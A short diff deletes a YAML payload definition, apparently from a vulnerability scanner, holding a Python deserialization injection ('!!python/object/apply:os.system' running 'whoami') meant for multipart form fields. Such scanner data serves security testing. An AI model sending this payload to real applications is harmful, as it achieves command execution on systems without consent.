@@ -1,9 +1,0 @@
-payload:
-  - |
-    !!python/object/apply:os.system
-    args: ['whoami']
-encoder:
-  - Plain
-placeholder:
-  - HTMLMultipartForm
-type: DeserializePython
